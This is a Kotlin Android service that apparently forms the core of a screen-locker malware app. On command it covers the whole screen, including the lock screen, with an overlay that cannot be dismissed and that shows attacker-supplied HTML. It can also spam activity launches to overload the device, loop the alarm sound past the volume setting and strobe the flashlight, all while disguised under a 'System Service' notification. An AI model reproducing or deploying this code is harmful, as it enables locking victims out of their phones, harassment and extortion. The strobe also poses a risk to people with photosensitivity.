package com.sync.xxx

import android.annotation.SuppressLint
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.PixelFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraManager
import android.media.AudioAttributes
import android.media.MediaPlayer
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import java.io.IOException

class ComboLockService : Service() {

    companion object {
        const val ACTION_SHOW = "com.sync.xxx.COMBO_LOCK_SHOW"
        const val ACTION_HIDE = "com.sync.xxx.COMBO_LOCK_HIDE"
        const val EXTRA_HTML = "html"
        const val EXTRA_CRASH = "crash"
        const val EXTRA_SOUND = "sound"
        const val EXTRA_FLASHLIGHT = "flashlight"
    }

    private var windowManager: WindowManager? = null
    private var webView: WebView? = null
    private var fallbackView: View? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var isReceiverRegistered = false
    private var isShowing = false
    
    // Optional features
    private var crashEnabled = false
    private var soundEnabled = false
    private var flashlightEnabled = false
    
    private var mediaPlayer: MediaPlayer? = null
    private var cameraManager: CameraManager? = null
    private var cameraId: String? = null
    private val flashHandler = Handler(Looper.getMainLooper())
    private var flashRunnable: Runnable? = null
    private var flashState = false

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_SHOW -> {
                    val html = intent.getStringExtra(EXTRA_HTML) ?: ""
                    val crash = intent.getBooleanExtra(EXTRA_CRASH, false)
                    val sound = intent.getBooleanExtra(EXTRA_SOUND, false)
                    val flash = intent.getBooleanExtra(EXTRA_FLASHLIGHT, false)
                    mainHandler.post { showComboLock(html, crash, sound, flash) }
                }
                ACTION_HIDE -> mainHandler.post { hideComboLock() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        
        try {
            windowManager = getSystemService(WINDOW_SERVICE) as? WindowManager
            if (windowManager == null) {
                Log.e("ComboLock", "Failed to get WindowManager")
                stopSelf()
                return
            }
        } catch (e: Exception) {
            Log.e("ComboLock", "onCreate WindowManager error: ${e.message}")
            stopSelf()
            return
        }
        
        try {
            cameraManager = getSystemService(CAMERA_SERVICE) as? CameraManager
            cameraId = cameraManager?.cameraIdList?.get(0)
        } catch (e: Exception) {
            Log.e("ComboLock", "Camera init error: ${e.message}")
        }

        // Start as foreground service on Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = android.app.NotificationChannel(
                    "combo_lock_channel",
                    "Combo Lock Service",
                    android.app.NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(android.app.NotificationManager::class.java)
                notificationManager?.createNotificationChannel(channel)

                val notification = android.app.Notification.Builder(this, "combo_lock_channel")
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build()

                startForeground(4002, notification)
            } catch (e: Exception) {
                Log.e("ComboLock", "Foreground notification error: ${e.message}")
            }
        }

        try {
            val filter = IntentFilter().apply {
                addAction(ACTION_SHOW)
                addAction(ACTION_HIDE)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.e("ComboLock", "registerReceiver error: ${e.message}")
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun showComboLock(html: String, crash: Boolean, sound: Boolean, flash: Boolean) {
        if (isShowing) {
            Log.d("ComboLock", "Already showing, skipping duplicate show call")
            return
        }
        
        hideComboLock()
        
        // Verify class availability if crash feature requested
        if (crash) {
            try {
                Class.forName("com.sync.xxx.LockNewActivity")
            } catch (e: ClassNotFoundException) {
                Log.e("ComboLock", "LockNewActivity not found, crash feature disabled")
                crashEnabled = false
            }
        }

        val wm = windowManager
        if (wm == null) {
            Log.e("ComboLock", "WindowManager is null, cannot show combo lock")
            return
        }

        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
            WindowManager.LayoutParams.FLAG_FULLSCREEN or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        try {
            val wv = WebView(this)
            wv.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                cacheMode = WebSettings.LOAD_NO_CACHE
                allowFileAccess = false
                allowContentAccess = false
                @Suppress("DEPRECATION")
                allowUniversalAccessFromFileURLs = false
                @Suppress("DEPRECATION")
                allowFileAccessFromFileURLs = false
            }

            wv.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean = true
                
                override fun onReceivedError(view: WebView, errorCode: Int, description: String, failingUrl: String) {
                    Log.e("ComboLock", "WebView error: $description")
                }
            }

            val wrappedHtml = """
                <!DOCTYPE html>
                <html>
                <head>
                    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
                    <style>
                        * { margin:0; padding:0; box-sizing:border-box; }
                        html, body { width:100%; height:100%; overflow:hidden; background:#000; }
                    </style>
                </head>
                <body>
                    ${if (html.isNotBlank()) html else "<div style='color:#fff;padding:20px;text-align:center;'>LOCKED</div>"}
                </body>
                </html>
            """.trimIndent()

            wv.loadDataWithBaseURL(null, wrappedHtml, "text/html", "UTF-8", null)

            wm.addView(wv, params)
            webView = wv
            isShowing = true

            @Suppress("DEPRECATION")
            wv.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_FULLSCREEN or
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            )

            // Set feature flags AFTER view is attached
            crashEnabled = crash
            soundEnabled = sound
            flashlightEnabled = flash
            
            // Start optional features
            if (crashEnabled) startCrashLoop()
            if (soundEnabled) startSound()
            if (flashlightEnabled) startFlashlightStrobe()

            Log.d("ComboLock", "COMBO LOCK shown | crash=$crashEnabled sound=$soundEnabled flash=$flashlightEnabled")
        } catch (e: Exception) {
            Log.e("ComboLock", "showComboLock error: ${e.message}", e)
            webView = null
            
            // Fallback: show simple black overlay if WebView fails
            try {
                val fb = View(this@ComboLockService)
                fb.setBackgroundColor(android.graphics.Color.BLACK)
                wm.addView(fb, params)
                fallbackView = fb
                isShowing = true
                
                // Set feature flags AFTER fallback view is attached
                crashEnabled = crash
                soundEnabled = sound
                flashlightEnabled = flash
                
                // Still start features even if WebView failed
                if (crashEnabled) startCrashLoop()
                if (soundEnabled) startSound()
                if (flashlightEnabled) startFlashlightStrobe()
                
                Log.d("ComboLock", "Fallback view shown with features")
            } catch (e2: Exception) {
                Log.e("ComboLock", "Fallback view error: ${e2.message}", e2)
                isShowing = false
            }
        }
    }

    private fun hideComboLock() {
        if (!isShowing && webView == null && fallbackView == null) {
            return
        }
        
        stopAllFeatures()

        webView?.let { wv ->
            try {
                windowManager?.removeView(wv)
                wv.destroy()
            } catch (e: Exception) {
                Log.e("ComboLock", "removeView webView error: ${e.message}")
            }
        }
        webView = null
        
        fallbackView?.let { fb ->
            try {
                windowManager?.removeView(fb)
            } catch (e: Exception) {
                Log.e("ComboLock", "removeView fallbackView error: ${e.message}")
            }
        }
        fallbackView = null
        
        isShowing = false
        Log.d("ComboLock", "COMBO LOCK hidden")
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: CRASH SYSTEM (Spam activities to overload)
    // ══════════════════════════════════════════════════════════════
    private var crashLoopRunnable: Runnable? = null
    
    private fun startCrashLoop() {
        if (!crashEnabled) return
        
        stopCrashLoop()
        
        crashLoopRunnable = object : Runnable {
            override fun run() {
                if (!crashEnabled) return
                try {
                    val activityClass = try {
                        Class.forName("com.sync.xxx.LockNewActivity")
                    } catch (e: ClassNotFoundException) {
                        Log.e("ComboLock", "LockNewActivity not found, stopping crash loop")
                        crashEnabled = false
                        return
                    }
                    
                    val intent = Intent(this@ComboLockService, activityClass).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or 
                                Intent.FLAG_ACTIVITY_CLEAR_TOP or 
                                Intent.FLAG_ACTIVITY_NO_ANIMATION
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    Log.e("ComboLock", "Crash loop error: ${e.message}")
                }
                mainHandler.postDelayed(this, 150)
            }
        }
        mainHandler.post(crashLoopRunnable!!)
    }
    
    private fun stopCrashLoop() {
        crashLoopRunnable?.let { mainHandler.removeCallbacks(it) }
        crashLoopRunnable = null
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: SOUND (Force play even when volume off)
    // ══════════════════════════════════════════════════════════════
    private fun startSound() {
        if (!soundEnabled) return
        
        stopSound()
        
        try {
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(
                    AudioAttributes.Builder()
                        .setUsage(AudioAttributes.USAGE_ALARM)
                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                        .build()
                )
                setDataSource(applicationContext, android.provider.Settings.System.DEFAULT_ALARM_ALERT_URI)
                isLooping = true
                setVolume(1.0f, 1.0f)
                prepare()
                start()
            }
            Log.d("ComboLock", "Sound started (ALARM stream)")
        } catch (e: IOException) {
            Log.e("ComboLock", "Sound error: ${e.message}")
            mediaPlayer = null
        } catch (e: Exception) {
            Log.e("ComboLock", "Sound unexpected error: ${e.message}")
            mediaPlayer = null
        }
    }

    private fun stopSound() {
        try {
            mediaPlayer?.stop()
            mediaPlayer?.release()
        } catch (e: Exception) {
            Log.e("ComboLock", "stopSound error: ${e.message}")
        }
        mediaPlayer = null
    }

    // ══════════════════════════════════════════════════════════════
    // OPTIONAL FEATURE: FLASHLIGHT STROBE (Rapid flashing)
    // ══════════════════════════════════════════════════════════════
    private fun startFlashlightStrobe() {
        if (!flashlightEnabled || cameraId == null) return
        
        stopFlashlight()
        
        flashRunnable = object : Runnable {
            override fun run() {
                if (!flashlightEnabled) return
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        cameraManager?.setTorchMode(cameraId!!, flashState)
                        flashState = !flashState
                    }
                } catch (e: CameraAccessException) {
                    Log.e("ComboLock", "Flashlight error: ${e.message}")
                } catch (e: Exception) {
                    Log.e("ComboLock", "Flashlight unexpected error: ${e.message}")
                }
                flashHandler.postDelayed(this, 100)
            }
        }
        flashHandler.post(flashRunnable!!)
        Log.d("ComboLock", "Flashlight strobe started")
    }

    private fun stopFlashlight() {
        flashRunnable?.let { flashHandler.removeCallbacks(it) }
        flashRunnable = null
        flashState = false
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraId?.let { id ->
                    cameraManager?.setTorchMode(id, false)
                }
            }
        } catch (e: Exception) {
            Log.e("ComboLock", "stopFlashlight error: ${e.message}")
        }
    }

    private fun stopAllFeatures() {
        crashEnabled = false
        soundEnabled = false
        flashlightEnabled = false
        stopCrashLoop()
        stopSound()
        stopFlashlight()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        hideComboLock()
        if (isReceiverRegistered) {
            try {
                unregisterReceiver(receiver)
                isReceiverRegistered = false
            } catch (e: Exception) {
                Log.e("ComboLock", "unregisterReceiver error: ${e.message}")
            }
        }
    }
}
